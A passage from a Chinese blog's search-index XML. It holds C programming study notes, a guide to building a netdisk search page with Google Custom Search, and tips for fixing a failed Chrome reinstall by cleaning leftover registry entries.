class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;3楼\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;其他楼层\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>goto语句</p>
<p>goto(只能跳转到同一作用域)任意地方都能使用,无条件跳转,不能滥用,代码会很乱</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">goto</span> hello;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1111111111\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2222222222\n&quot;</span>);</span><br><span class="line">        hello:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;3333333333\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/28/fNUX46T5h1YqSc9.png" alt="image-20210122205440917" style="zoom:150%;" /></p>
<p>类型转换:</p>
<p>1.隐式转换</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">double</span> a;</span><br><span class="line"><span class="keyword">int</span> b=<span class="number">1</span>;</span><br><span class="line"><span class="comment">//编译器自动转换，把b转 换为double类型后， 再给a赋值(隐式转换)</span></span><br><span class="line">a= b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf\n&quot;</span>，b) ;</span><br></pre></td></tr></table></figure>
<p>2.强制类型转换  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="comment">//a只有在此语句执行时，才强制转换为double类型，其它地址还是为int类型</span></span><br><span class="line"><span class="built_in">printf</span> (<span class="string">&quot;%lf\n&quot;</span>，(<span class="keyword">double</span>)a) ;<span class="comment">//(类型)变量名</span></span><br></pre></td></tr></table></figure>
<p>转换原则:占用内存字节数少(值域小)的类型，向占用内存字节数多(值域大)的类型转换，以保证精度不降低。</p>
<p>3.浮点型和整型打印问题<br>a)不要直接通过%d，打印一个浮点型变量，得不到想要的结果，要想得到结果，强制类型转换</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">double</span> a = <span class="number">11.11</span> ;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(<span class="keyword">int</span>)a) ;</span><br></pre></td></tr></table></figure>
<p>b)不要直接通过%f或%lf，打印一个整型变量，得不到想要的结果，要想得到结果，强制类型转换</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ol>
<li>数组内部的变量或数组,不初始化,它的值为随机数</li>
<li>部分初始化，其它自动初始化为0<br>0~2(前3个元素)分别为1，2， 3， 其 它初始化为0<br>int a1[10] = {1, 2, 3};</li>
<li>数组全部元素初始化为0<br>int a2[10] = {0} ;</li>
<li>如果定义时同时初始化，第1个[]内部可以不写内容<br>编译器会根据用户初始化的元素来确定数组的大小<br>int a3[]={1,2,3,4,5,6,7,8,9,10};</li>
<li>如果第1个[]内容不写，必须初始化，否则语法错误</li>
</ol>
<h3 id="数组名"><a href="#数组名" class="headerlink" title="数组名"></a>数组名</h3><ul>
<li>数组名是常量,不能修改</li>
<li>数组名是数组首元素地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a=%p,&amp;a[0]=%p\n&quot;</span>,a,&amp;a[<span class="number">0</span>]);<span class="comment">//%p输出地址</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sizeof(a)=%lu\n&quot;</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/23/EFTYRgCKmLP263d.png" alt=""></p>
<h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><p>内存中没有多维,只有一维,多维数组是特殊的一维数组</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果定义时，同时初始化，第1个[]可以不写内容</span></span><br><span class="line"><span class="keyword">int</span> a1[][<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>&#125;;<span class="comment">//正确</span></span><br><span class="line"><span class="comment">//如果第1个[]不写，必须初始化</span></span><br><span class="line"><span class="keyword">int</span> a3[][<span class="number">4</span>]; <span class="comment">//错误</span></span><br></pre></td></tr></table></figure>
<h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><ol>
<li>C语言没有字符串类型,用字符数组模拟</li>
<li>字符串一定是字符数组,字符数组就不一定是字符串</li>
<li>如果字符数组以字符’\0’ (‘\0’等级于数字0)结尾,那么这个字符数组就是字符串</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1、C语言没有字符串类型，用字符数组模拟</span></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="comment">//2、字符串一定是字符数组，字符数组就不一定是字符串</span></span><br><span class="line"><span class="comment">//3、如果字符数组以字符&#x27;\0&#x27;(&#x27;\0&#x27;等级于数字0)结尾，那么这个字符数组就是字符串</span></span><br><span class="line"><span class="keyword">char</span> b[] = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;; <span class="comment">//字符数组,方括号中不能填数字,否则会自动补零,就变成字符串</span></span><br><span class="line"><span class="keyword">char</span> c[<span class="number">10</span>] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;; <span class="comment">//字符串</span></span><br><span class="line"><span class="keyword">char</span> d[<span class="number">10</span>] = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="number">0</span>&#125;; <span class="comment">//字符串</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[]=&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%s\n&quot;</span>,a);<span class="comment">//会乱码,没有结束符</span></span><br><span class="line">    <span class="keyword">char</span> b[]=&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b=%s\n&quot;</span>,b);<span class="comment">//输出abc,遇到\0就停止</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/27/Re83qQAwDB7K42Y.png" alt=""></p>
<p>字符数组初始化(常用)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> a[<span class="number">10</span>]=<span class="string">&quot;abcde&quot;</span>;<span class="comment">//最多写9个字符,留一个放结束符</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a=%s\n&quot;</span>,a);</span><br><span class="line"><span class="keyword">char</span> b[]=<span class="string">&quot;abcde&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b=%s\n&quot;</span>,b);<span class="comment">//sizeof()测数据类型大小，不会因为结束符提前结束</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sizeof(b)=%lu\n&quot;</span>,<span class="keyword">sizeof</span>(b));<span class="comment">//输出6,b这个数组有5个字符,会自动补加结束符(隐藏)</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/27/iDy86UJt1X2r3ZK.png" alt=""></p>
<p>\0后面最好不要跟数字,有可能组成转义字符</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[]=<span class="string">&quot;\0abc&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%s\n&quot;</span>,a);<span class="comment">//输出为空,含有结束符\0</span></span><br><span class="line">    <span class="keyword">char</span> b[]=<span class="string">&quot;\0417abcde&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b=%s\n&quot;</span>,b);<span class="comment">//输出非空,\0与其后数字组成转义字符\041,通过man ascii命令查到\041对应!(感叹号)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/27/VJXSilNmnR6wyhB.png" alt=""></p>
<p>函数的调用:产生随机数</p>
<p>当调用函数时，需要关心5要素:</p>
<ul>
<li>头文件:包含指定的头文件</li>
<li>函数名字:函数名字必须和头文件声明的名字一样</li>
<li>功能:需要知道此函数功能后再调用</li>
<li>参数:参数类型要匹配</li>
<li>返回值:根据需要接收返回值</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;//产生随机数的函数包含在此</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;//获取当前系统时间的函数包含在此</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="comment">//先设置种子,种子设置一次即可</span></span><br><span class="line">        <span class="comment">//srand(10);</span></span><br><span class="line">        <span class="comment">/*如果srand()参数一样,则每次产生的随机数一样,</span></span><br><span class="line"><span class="comment">        每次启动计算机以后，种子就是定值了，</span></span><br><span class="line"><span class="comment">        所以根据公式推算出来的结果</span></span><br><span class="line"><span class="comment">        （也就是生成的随机数）就是固定的*/</span></span><br><span class="line">        <span class="comment">/*time(NULL)用来获取系统当前时间,</span></span><br><span class="line"><span class="comment">        由于时间会变,srand()也会改变*/</span></span><br><span class="line">        srand((<span class="keyword">unsigned</span> <span class="keyword">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> num;</span><br><span class="line">        <span class="keyword">for</span>(;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">                num=rand();<span class="comment">//rand()产生随机数</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;num=%d\n&quot;</span>,num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/27/lTzVDuG41P6RUr7.png" alt=""></p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h3><blockquote>
<p>strlen需要使用返回值,返回值就是字符串的长度,从首元素开始,到结束符为止的长度,结束符不算(遇到’\0’结束)</p>
</blockquote>
<h3 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h3><blockquote>
<p>拷贝原理:从首元素开始,到结束符(\0)为止的长度</p>
</blockquote>
<h3 id="strncpy"><a href="#strncpy" class="headerlink" title="strncpy"></a>strncpy</h3><blockquote>
<p>可以把”\0”拷贝过去,但是”\0”后面的就不能了</p>
</blockquote>
]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>自建网盘搜索引擎</title>
    <url>/article/57501.html</url>
    <content><![CDATA[<h1 id="教你如何自建网盘资源搜索引擎"><a href="#教你如何自建网盘资源搜索引擎" class="headerlink" title="教你如何自建网盘资源搜索引擎"></a>教你如何自建网盘资源搜索引擎</h1><a id="more"></a>
<h3 id="1-利用Google-要能科学上网"><a href="#1-利用Google-要能科学上网" class="headerlink" title="1.利用Google(要能科学上网)"></a>1.利用Google(要能科学上网)</h3><p><a href="https://cse.google.com/cse/" class="LinkCard" target="_blank">点击这里直达</a></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7559cf809c4cf41e9f0c6c79d7db4885.png" alt="image-20201114100907681"></p>
<h3 id="2-点击开始吧"><a href="#2-点击开始吧" class="headerlink" title="2.点击开始吧"></a>2.点击开始吧</h3><p>进入如下界面</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/1ae2e326d170098cd6399ebb6914aaa8.png" alt="image-20201114100937412"></p>
<h3 id="3-点击新建搜索引擎"><a href="#3-点击新建搜索引擎" class="headerlink" title="3.点击新建搜索引擎"></a>3.点击新建搜索引擎</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/56e6799e4eb5d859ce4c14e988318eda.png" alt="image-20201114101047442"></p>
<h3 id="4-依次进行配置"><a href="#4-依次进行配置" class="headerlink" title="4.依次进行配置"></a>4.依次进行配置</h3><p>注意第一个是要搜索的网站</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c2c6d2ec8573ddbe46875698e95678b9.png" alt="image-20201114101417580"></p>
<h3 id="5-创建完毕后-点击修改搜索引擎-选择刚才创建的-找到搜索引擎ID-也可以点击获取代码-插入代码即可"><a href="#5-创建完毕后-点击修改搜索引擎-选择刚才创建的-找到搜索引擎ID-也可以点击获取代码-插入代码即可" class="headerlink" title="5.创建完毕后,点击修改搜索引擎,选择刚才创建的,找到搜索引擎ID(也可以点击获取代码,插入代码即可)"></a>5.创建完毕后,点击修改搜索引擎,选择刚才创建的,找到搜索引擎ID(也可以点击获取代码,插入代码即可)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/46d801c5e960346b65910892afbf9cc7.png" alt="image-20201114103410456"></p>
<p>外观不满意的话可以自行修改,最后附上代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-id">#main</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">width</span><span class="selector-pseudo">:750px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin</span><span class="selector-pseudo">:20px</span> <span class="selector-tag">auto</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#main</span> <span class="selector-tag">p</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">font-size</span><span class="selector-pseudo">:25px</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">font-weight</span><span class="selector-pseudo">:bold</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin-button</span><span class="selector-pseudo">:100px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">百度网盘资源搜索器</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> cx = <span class="string">&#x27;你的搜索引擎ID&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> gcse = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    gcse.type = <span class="string">&#x27;text/javascript&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    gcse.async = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">    gcse.src = <span class="string">&#x27;https://cse.google.com/cse.js?cx=&#x27;</span> + cx;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;script&#x27;</span>)[<span class="number">0</span>];</span></span><br><span class="line">    s.parentNode.insertBefore(gcse, s);</span><br><span class="line">  &#125;)();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">gcse:search</span>&gt;</span><span class="tag">&lt;/<span class="name">gcse:search</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>无处安放</category>
      </categories>
      <tags>
        <tag>搜索引擎</tag>
        <tag>网盘</tag>
      </tags>
  </entry>
  <entry>
    <title>解决谷歌浏览器卸载后无法重新安装的问题</title>
    <url>/article/30147.html</url>
    <content><![CDATA[<h1 id="解决谷歌浏览器卸载后无法重新安装的问题"><a href="#解决谷歌浏览器卸载后无法重新安装的问题" class="headerlink" title="解决谷歌浏览器卸载后无法重新安装的问题"></a>解决谷歌浏览器卸载后无法重新安装的问题</h1><a id="more"></a>
<p>你是否在卸载Google后重装的路上焦头烂额？下载一遍又一遍却无法安装？（这可真是一时卸载一时爽，卸载容易重装难啊）</p>
<p>Google下载后无论怎么弄都安装不上，你焦急的求助度娘，百度出来一堆教程，却不知那个有效，只好一个个尝试搞不懂的操作（嘿嘿，不要急着否认，曾经的我就是这样）。</p>
<p>这些方法也有道理，<strong><em>Google出现安装不上的情况，一般是由于电脑之前安装过谷歌浏览器，使谷歌浏览器的注册表仍然残留在系统中，导致重新安装失败。</em></strong></p>
<p>照着网上给出的教程，我是一顿操作猛如虎（管它是什么，一顿乱删），再来安装Google，还是安装不上（当时我试了一遍又一遍，都不管用，快要崩溃），有一种想砸键盘的冲动（再也不用Google了，让你欺负我）。</p>
<p>不过说实话，Google确实好用，不舍得抛弃，我鼓捣来鼓捣去，最终找到解决方法。在这里，我把我的尝试也给列出来了。</p>
<p>解决办法如下：</p>
<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a><strong>方法一：</strong></h2><p>1、打开电脑“运行”（快捷键windows+R，也可以鼠标右键点击电脑左下角“开始”键再点击“运行”）。然后输入“regedit”点击“确定”（会出来一个注册表编辑器的东西，点击“是”即可）</p>
<p>2、依次进入“计算机\HKEY_CURRENT_USER\Software\Google”文件夹并将其删除</p>
<p>3、如果无法查看到谷歌文件，可以尝试在注册列表中按住快捷键Ctrl+F，就可以进行查找看，然后再将谷歌浏览器的相关项目删除，这样就能将谷歌注册表清理干净了，有关谷歌浏览器的残留文件删除完后，您就可以尝试再次谷歌浏览器安装操作了</p>
<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a><strong><em>方法二：</em></strong></h2><p>1.打开360安全卫士，选择电脑清理</p>
<p>2.点击单项清理，选择“清理注册表”</p>
<p>3.点击“一键清理”，再安装Google（如果还报错，尝试重启电脑）</p>
<h2 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h2><p>1.新建一个文本文件（不建议使用记事本，我用的是notepad++,直接在桌面建了一个）</p>
<p>2.将以下代码复制粘贴在该文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">;WARNING, this file will remove Google Chrome registry entries  </span><br><span class="line"></span><br><span class="line">;from your Windows Registry. Consider backing up your registry before</span><br><span class="line"></span><br><span class="line">; using this file: http://support.microsoft.com/kb/322756</span><br><span class="line"></span><br><span class="line">; To run this file, save it as <span class="string">&#x27;remove.reg&#x27;</span> on your desktop and double-click it.</span><br><span class="line"></span><br><span class="line">[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\ChromeHTML] </span><br><span class="line"></span><br><span class="line">[-HKEY_LOCAL_MACHINE\SOFTWARE\Clients\StartMenuInternet\chrome.exe] </span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\RegisteredApplications]</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;Chrome&quot;</span>=-</span><br><span class="line"></span><br><span class="line">[-HKEY_CURRENT_USER\SOFTWARE\Classes\ChromeHTML] </span><br><span class="line"></span><br><span class="line">[-HKEY_CURRENT_USER\SOFTWARE\Clients\StartMenuInternet\chrome.exe] </span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\RegisteredApplications]</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;Chrome&quot;</span>=-</span><br><span class="line"></span><br><span class="line">[-HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\Chrome]</span><br><span class="line"></span><br><span class="line">[-HKEY_CURRENT_USER\Software\Google\Update\Clients\&#123;8A69D345-D564-463c-AFF1-A69D9E530F96&#125;]</span><br><span class="line"></span><br><span class="line">[-HKEY_CURRENT_USER\Software\Google\Update\ClientState\&#123;8A69D345-D564-463c-AFF1-A69D9E530F96&#125;]</span><br><span class="line"></span><br><span class="line">[-HKEY_CURRENT_USER\Software\Google\Update\Clients\&#123;00058422-BABE-4310-9B8B-B8DEB5D0B68A&#125;]</span><br><span class="line"></span><br><span class="line">[-HKEY_CURRENT_USER\Software\Google\Update\ClientState\&#123;00058422-BABE-4310-9B8B-B8DEB5D0B68A&#125;]</span><br><span class="line"></span><br><span class="line">[-HKEY_LOCAL_MACHINE\SOFTWARE\Google\Update\ClientStateMedium\&#123;8A69D345-D564-463c-AFF1-A69D9E530F96&#125;]</span><br><span class="line"></span><br><span class="line">[-HKEY_LOCAL_MACHINE\SOFTWARE\Google\Update\Clients\&#123;8A69D345-D564-463c-AFF1-A69D9E530F96&#125;]</span><br><span class="line"></span><br><span class="line">[-HKEY_LOCAL_MACHINE\SOFTWARE\Google\Update\ClientState\&#123;8A69D345-D564-463c-AFF1-A69D9E530F96&#125;]</span><br><span class="line"></span><br><span class="line">[-HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Google\Update\Clients\&#123;8A69D345-D564-463c-AFF1-A69D9E530F96&#125;]</span><br></pre></td></tr></table></figure>
<p>3.将该文件命名为rm.reg</p>
<p>4.双击运行（可能会出来一些选项，我默认了），再重装Google即可</p>
<h2 id="方法四"><a href="#方法四" class="headerlink" title="方法四:"></a>方法四:</h2><p>听闻geek卸载软件可以删除注册表，所以可以用它卸载Google，且重装不会有问题。（可能对大部分人，此方法意义不大）<br>给出链接<br> 链接:<a href="https://pan.baidu.com/s/1qaDZ05A9yD1jhOcUeQppuA">https://pan.baidu.com/s/1qaDZ05A9yD1jhOcUeQppuA</a><br> 提取码:386a</p>
<h2 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h2><p>该文仅为记载我在重装Google的艰辛历程，以上方法均为网络收集，如果和我有相同问题的朋友可以尝试一下，节约你百度的时间。如果对于第三种方法不懂这里有现成的文件，下面给出链接：<a href="https://download.csdn.net/download/moshangduanchang/12354433">点这里呀</a></p>
]]></content>
      <categories>
        <category>无处安放</category>
      </categories>
      <tags>
        <tag>Google</tag>
      </tags>
  </entry>
</search>
